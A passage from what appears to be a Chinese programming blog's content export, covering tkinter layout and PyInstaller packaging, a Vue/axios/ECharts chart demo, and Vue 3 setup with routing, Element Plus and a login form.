class="string">&quot;left&quot;</span>, padx=<span class="string">&quot;10&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    Button(f2, width=<span class="number">5</span>, height=<span class="number">10</span>, bg=<span class="string">&quot;black&quot;</span> <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;white&quot;</span>).pack(side=<span class="string">&quot;left&quot;</span>)</span><br><span class="line">root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>常用方法</li>
</ul>
<p><img src="/aposts/6df9a046/image-20230518113530055.png" alt="image-20230518113530055"></p>
<h3 id="place-布局管理器"><a href="#place-布局管理器" class="headerlink" title="place 布局管理器"></a>place 布局管理器</h3><p>place 布局管理器可以通过坐标精确控制组件的位置，适用于一些布局更加灵活的场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line"></span><br><span class="line">root= Tk()</span><br><span class="line">root.geometry(&quot;500x300&quot;)</span><br><span class="line">root.title(&quot;布局管理 place&quot;)</span><br><span class="line">root[&quot;bg&quot;]=&quot;white&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1= Frame(root,width=200,height=200,bg=&quot;green&quot;)</span><br><span class="line">f1.place(x=30,y=30)</span><br><span class="line">Button(root,text=&quot;hebut&quot;).place(relx=0.5,rely=0,x=100,y=200,relwidth=0.2,relheight=0.2)</span><br><span class="line">Button(f1,text=&quot;programmer&quot;).place(relx=0.6,rely=0.7)</span><br><span class="line">Button(f1,text=&quot;关关雎鸠&quot;).place(relx=0.2,rely=0.2)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/aposts/6df9a046/image-20230518114625901.png" alt="image-20230518114625901"></p>
<h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><ul>
<li>源代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Application</span>(<span class="title class_ inherited__">Frame</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master=<span class="literal">None</span></span>):  <span class="comment"># super()代表的是父类的定义，而不是父类对象</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        self.master = master</span><br><span class="line">        self.pack()</span><br><span class="line">        self.createWidget()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createWidget</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建登录界面的组件</span></span><br><span class="line">        self.label01 = Label(self, text=<span class="string">&quot;用户名&quot;</span>)</span><br><span class="line">        self.label01.pack()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># StringVar 变量绑定到指定的组件。</span></span><br><span class="line">        <span class="comment"># StringVar 变量的值发生变化，组件内容也变化；</span></span><br><span class="line">        <span class="comment"># 组件内容发生变化，StringVar 变量的值也发生变化。 v1 = StringVar()</span></span><br><span class="line">        v1 = StringVar()</span><br><span class="line">        self.entry01 = Entry(self, textvariable=v1)</span><br><span class="line">        self.entry01.pack()</span><br><span class="line">        v1.<span class="built_in">set</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(v1.get())</span><br><span class="line">        <span class="built_in">print</span>(self.entry01.get())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建密码框</span></span><br><span class="line">        self.label02 = Label(self, text=<span class="string">&quot;密码&quot;</span>)</span><br><span class="line">        self.label02.pack()</span><br><span class="line"></span><br><span class="line">        v2 = StringVar()</span><br><span class="line">        self.entry02 = Entry(self, textvariable=v2, show=<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        self.entry02.pack()</span><br><span class="line"></span><br><span class="line">        Button(self, text=<span class="string">&quot;登陆&quot;</span>, command=self.login).pack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        username = self.entry01.get()</span><br><span class="line">        pwd = self.entry02.get()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;去数据库比对用户名和密码！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户名：&quot;</span> + username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码：&quot;</span> + pwd)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> pwd == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;学习系统&quot;</span>, <span class="string">&quot;登录成功！欢迎开始学习！&quot;</span>)</span><br><span class="line">            res = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(res.status_code)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;学习系统&quot;</span>, <span class="string">&quot;登录失败！用户名或密码错误！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    root = Tk()</span><br><span class="line">    root.geometry(<span class="string">&quot;400x130+200+300&quot;</span>)</span><br><span class="line">    app = Application(master=root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>安装打包依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller  -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<ul>
<li>打包</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\studyTK&gt;pyinstaller -F main.py</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令完成后，在dist目录就发现了打包好的exe文件，运行即可</li>
</ul>
<p><img src="/aposts/6df9a046/image-20230518151216662.png" alt="image-20230518151216662"></p>
]]></content>
      <categories>
        <category>tkinter</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>tkinter</tag>
      </tags>
  </entry>
  <entry>
    <title>vue+axios+echarts</title>
    <url>/aposts/63cd4e03/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>最近再做接口测试平台的报表功能，直接再网上搜下简单的demo，居然没有找到合适的，最后自己写了个简单的入门demo</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>vue环境自行搭建</li>
<li>安装<code>echarts</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install echarts --save</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>axios</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure>

<ul>
<li><code>main.js</code>设置下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import Vue from &quot;vue&quot;</span><br><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">// 设置接口访问的根目录</span><br><span class="line">axios.defaults.baseURL = &quot;http://127.0.0.1:8100/myapi/&quot;</span><br><span class="line">// 设置原型属性后,其他地方如果要调用，只要用this.$http.get就可以了</span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<ul>
<li>完整vue代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;echarts_box&quot; style=&quot;width: 600px;height:400px;&quot;&gt;</span><br><span class="line">        </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var echarts = require(&#x27;echarts&#x27;);</span><br><span class="line"></span><br><span class="line">  export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">      this.drawLine();</span><br><span class="line">    &#125;,</span><br><span class="line">    created() &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      async drawLine() &#123;</span><br><span class="line">           const &#123;data:res&#125;  = await this.$http.get(&#x27;reports&#x27;)</span><br><span class="line">            if (res.code != 1)&#123;</span><br><span class="line">                return this.$message.erro(&quot;获取数据失败&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(res)</span><br><span class="line">          // 初始化echarts实例</span><br><span class="line">          let myChart = echarts.init(document.getElementById(&#x27;echarts_box&#x27;))</span><br><span class="line">          myChart.setOption(&#123;</span><br><span class="line">    	  	title: &#123;text: res.data.title.text&#125;,</span><br><span class="line">          	tooltip: &#123;&#125;,</span><br><span class="line">  		  	xAxis: &#123;data: res.data.xAxis.data&#125;,</span><br><span class="line">  		  	yAxis: &#123;&#125;,</span><br><span class="line">  		  	series: [&#123;name: res.data.series[0].name,type: res.data.series[0].type,</span><br><span class="line">      				data: res.data.series[0].data&#125;]</span><br><span class="line">			&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>后台接口返回的<code>json</code>数据</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;获取成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;简单饼状图&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;xAxis&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;衬衫&quot;</span><span class="punctuation">,</span> <span class="string">&quot;羊毛衫&quot;</span><span class="punctuation">,</span> <span class="string">&quot;雪纺衫&quot;</span><span class="punctuation">,</span> <span class="string">&quot;裤子&quot;</span><span class="punctuation">,</span> <span class="string">&quot;高跟鞋&quot;</span><span class="punctuation">,</span> <span class="string">&quot;袜子&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;产品&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;yAxis&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;series&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;销量&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bar&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">5</span><span class="punctuation">,</span> <span class="number">20</span><span class="punctuation">,</span> <span class="number">36</span><span class="punctuation">,</span> <span class="number">10</span><span class="punctuation">,</span> <span class="number">10</span><span class="punctuation">,</span> <span class="number">20</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>效果图如下</li>
</ul>
<p><img src="/aposts/63cd4e03/image-20220308090809791.png" alt="image-20220308090809791"></p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>vue3实践笔记</title>
    <url>/aposts/b435d821/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><a href="https://nodejs.org/en">node.js</a> 安装16.0以上的版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;node -v</span><br><span class="line">v18.17.0</span><br></pre></td></tr></table></figure>

<ul>
<li>你的当前工作目录正是打算创建项目的目录。在命令行中运行以下命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyVue&gt;npm init vue@latest</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这一指令将会安装并执行 <a href="https://github.com/vuejs/create-vue">create-vue</a>，它是 Vue 官方的项目脚手架工具</p>
<p>如果不确定是否要开启某个功能，你可以直接按下回车键选择 <code>No</code>。在项目被创建后，通过以下步骤安装依赖并启动开发服务器1：</p>
</blockquote>
<ul>
<li>在项目被创建后，通过以下步骤安装依赖并启动开发服务器：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; cd vue-project</span><br><span class="line">&gt; npm install</span><br><span class="line">&gt; npm run dev</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/b435d821/image-20230804152932990.png" alt="image-20230804152932990"></p>
<h2 id="vue配置"><a href="#vue配置" class="headerlink" title="vue配置"></a>vue配置</h2><ul>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// elementUI 3.0 版本</span><br><span class="line">npm install element-plus --save</span><br><span class="line">// http请求</span><br><span class="line">npm install axios  --save</span><br><span class="line">// 路由</span><br><span class="line">npm install vue-router@4 --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li><code>src\router\routers.js </code>  手动新建自定义路由</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">const routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &quot;login&quot;,</span><br><span class="line">        path: &quot;/login&quot;,</span><br><span class="line">        component: () =&gt; import(&quot;../components/Login.vue&quot;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &quot;home&quot;,</span><br><span class="line">        path: &quot;/home&quot;,</span><br><span class="line">        component: () =&gt; import(&quot;../components/Home.vue&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">export default routes;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>src\router\index.js</code>  对外暴露路由</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123; createRouter, createWebHistory &#125; from &quot;vue-router&quot;</span><br><span class="line">import routes from &quot;./routes&quot;</span><br><span class="line">var router=createRouter(&#123;</span><br><span class="line">    history:createWebHistory(),</span><br><span class="line">    routes</span><br><span class="line">&#125;)</span><br><span class="line">export default router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>src/index.js</code>  为全局配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#x27;./assets/main.css&#x27;</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">// 导入我的路由</span><br><span class="line">import router from &quot;./router/index&quot;</span><br><span class="line">// 导入ElementPlus</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;</span><br><span class="line">// 引用element的css</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line">const app = createApp(App)</span><br><span class="line">app.use(ElementPlus)</span><br><span class="line">app.use(router)</span><br><span class="line">app.mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>App.vue</code> 代码修改如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;template&gt;</span><br><span class="line"> &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>按需导入elementUI，在2.0版本中可以需要手动管理elementUI中各个组件，3.0中现在可以自动导入，安装如下插件：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后把下列代码插入到你的 <code>Vite</code> 或 <code>Webpack</code> 的配置文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//vite.config.js</span><br><span class="line"></span><br><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">// 新增</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // 新增下面两个</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>src\utils\ajax.js</code> 拦截<code>axios</code>  设置请求url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">const ajax = axios.create(&#123;</span><br><span class="line">    baseURL: &#x27;http://127.0.0.1:8100/testModel&#x27;,</span><br><span class="line">    timeout: 10000,</span><br><span class="line">    withCredentials: true</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">ajax.interceptors.response.use(</span><br><span class="line">    response =&gt; &#123;</span><br><span class="line">      //拦截响应，如果发现接口返回400做统一处理跳转到登陆</span><br><span class="line">      if (response.data.code) &#123;</span><br><span class="line">        switch (response.data.code) &#123;</span><br><span class="line">          case 400:</span><br><span class="line">            window.location.href=&#x27;/login/&#x27;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      const headers = response.headers</span><br><span class="line"></span><br><span class="line">      return response</span><br><span class="line">    &#125;,</span><br><span class="line">    //接口错误状态处理，也就是说无响应时的处理</span><br><span class="line">    error =&gt; &#123;</span><br><span class="line">        console.log(&quot;Please check your internet connection.&quot;);</span><br><span class="line">        console.log(error)</span><br><span class="line">        return Promise.reject(error) // 返回接口返回的错误信息</span><br><span class="line">    &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//导出我们建立的axios实例模块，ES6 export用法</span><br><span class="line">export default ajax;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//导出我们建立的axios实例模块，ES6 export用法</span><br><span class="line">export default ajax;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>src\utils\html.js</code> 所有请求都编写到这里</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ajax from &quot;./ajax&quot;;</span><br><span class="line">// export const GetPosts = () =&gt; ajax.get(&#x27;posts/1&#x27;)</span><br><span class="line">// export const GetsearchData = (params) =&gt; ajax.get(&#x27;/list&#x27;,&#123;params&#125;)</span><br><span class="line">// export const PostPosts = (params) =&gt; ajax.post(&#x27;posts&#x27;,params)</span><br><span class="line"></span><br><span class="line">export const LoginPost = (params) =&gt; ajax.post(&#x27;/login/&#x27;,params)</span><br><span class="line">export const CsrfGet = () =&gt; ajax.get(&#x27;/get_csrf_token/&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>package.json</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;dev&quot;: &quot;vite --host 0.0.0.0&quot;, // 修改为这样，不然无法用ip访问</span><br><span class="line">  &quot;build&quot;: &quot;vite build&quot;,</span><br><span class="line">  &quot;preview&quot;: &quot;vite preview&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><ul>
<li>编写登录界面<code>src\componets\Login</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;login-wrap&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">        :rules=&quot;rules&quot;为表单自定义规则</span><br><span class="line">        :model=&quot;loginForm&quot; 绑定js中的return 参数</span><br><span class="line">      --&gt;</span><br><span class="line">    &lt;el-form ref=&quot;loginFormRef&quot; :rules=&quot;rules&quot; :model=&quot;loginForm&quot; class=&quot;login_form&quot;&gt;</span><br><span class="line">      &lt;h1 class=&quot;title&quot;&gt;用户登录&lt;/h1&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;用户名&quot; prop=&quot;username&quot;&gt;</span><br><span class="line">        &lt;el-input type=&quot;text&quot; placeholder=&quot;用户账号&quot; v-model=&quot;loginForm.username&quot; auto-complete=&quot;off&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot; style=&quot;margin-left:10px;&quot;&gt;</span><br><span class="line">        &lt;el-input type=&quot;password&quot; placeholder=&quot;密码&quot; v-model=&quot;loginForm.password&quot; auto-complete=&quot;off&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item&gt;</span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;submitForm(loginFormRef)&quot; style=&quot;width: 100%;&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item&gt;</span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;resetForm(loginFormRef)&quot; style=&quot;width: 100%;&quot;&gt;重置&lt;/el-button&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">    &lt;/el-form&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">   </span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123; reactive, ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import type &#123; FormInstance, FormRules &#125; from &#x27;element-plus&#x27;</span><br><span class="line">import &#123; ElMessage &#125; from &#x27;element-plus&#x27;</span><br><span class="line"></span><br><span class="line">// 引用登录请求</span><br><span class="line">import &#123; LoginPost &#125; from &quot;../utils/html.js&quot;</span><br><span class="line"></span><br><span class="line">//引入路由函数</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;;</span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">interface LoginForm &#123;</span><br><span class="line">  username: string</span><br><span class="line">  password: string</span><br><span class="line">&#125;</span><br><span class="line">const loginFormRef = ref&lt;FormInstance&gt;()</span><br><span class="line">// 定义表单绑定的model</span><br><span class="line">const loginForm = reactive(&#123;</span><br><span class="line">  username: &quot;test&quot;,</span><br><span class="line">  password: &quot;&quot;,</span><br><span class="line">&#125;)</span><br><span class="line">// 定义规则</span><br><span class="line">const rules = reactive&lt;FormRules&lt;LoginForm&gt;&gt;(&#123;</span><br><span class="line">  username: [</span><br><span class="line">    &#123; required: true, message: &#x27;请输入用户名&#x27;, trigger: &#x27;blur&#x27; &#125;,</span><br><span class="line">    // &#123; min: 3, max: 5, message: &#x27;Length should be 3 to 5&#x27;, trigger: &#x27;blur&#x27; &#125;,</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  password: [</span><br><span class="line">    &#123;</span><br><span class="line">      required: true,</span><br><span class="line">      message: &#x27;请输入密码&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const submitForm = (formEl: FormInstance | undefined) =&gt; &#123;</span><br><span class="line">  if (!formEl) return</span><br><span class="line">  formEl.validate(async (valid, fields) =&gt; &#123;</span><br><span class="line">    if (valid) &#123;</span><br><span class="line">      console.log(&#x27;submit!&#x27;)</span><br><span class="line">      LoginPost(JSON.stringify(loginForm)).then(res =&gt; &#123;</span><br><span class="line">        console.log(res)</span><br><span class="line">        if (res[&quot;data&quot;][&quot;code&quot;] == 1) &#123;</span><br><span class="line">          // console.log(&quot;登录成功&quot;)</span><br><span class="line">          ElMessage(&#123;</span><br><span class="line">            message: &#x27;登录成功.&#x27;,</span><br><span class="line">            type: &#x27;success&#x27;,</span><br><span class="line">          &#125;)</span><br><span class="line">          localStorage.setItem(&#x27;username&#x27;, loginForm.username);</span><br><span class="line">          router.push(&quot;/home&quot;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          ElMessage(&#123;</span><br><span class="line">            message: res.data.msg,</span><br><span class="line">            type: &#x27;error&#x27;,</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log(&#x27;error submit!&#x27;, fields)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">const resetForm = (formEl: FormInstance | undefined) =&gt; &#123;</span><br><span class="line">  if (!formEl) return</span><br><span class="line">  formEl.resetFields()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">   </span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.login-wrap &#123;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  padding-top: 10%;</span><br><span class="line">  background-image: url(zdmc+);</span><br><span class="line">  /* background-color: #112346; */</span><br><span class="line">  background-repeat: no-repeat;</span><br><span class="line">  background-position: center right;</span><br><span class="line">  background-size: 100%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.login-container &#123;</span><br><span class="line">  border-radius: 10px;</span><br><span class="line">  margin: 0px auto;</span><br><span class="line">  width: 350px;</span><br><span class="line">  padding: 30px 35px 15px 35px;</span><br><span class="line">  background: #fff;</span><br><span class="line">  border: 1px solid #eaeaea;</span><br><span class="line">  text-align: left;</span><br><span class="line">  box-shadow: 0 0 20px 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.title &#123;</span><br><span class="line">  margin: 0px auto 40px auto;</span><br><span class="line">  text-align: center;</span><br><span class="line">  color: #505458;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="django后台"><a href="#django后台" class="headerlink" title="django后台"></a>django后台</h2><ul>
<li>代码来自<a href="aposts/8d0d1e49/">这里</a></li>
</ul>
<h3 id="跨域配置"><a href="#跨域配置" class="headerlink" title="跨域配置"></a>跨域配置</h3><ul>
<li><code>StudyDjango/StudyDjango/settings.py</code></li>
</ul>
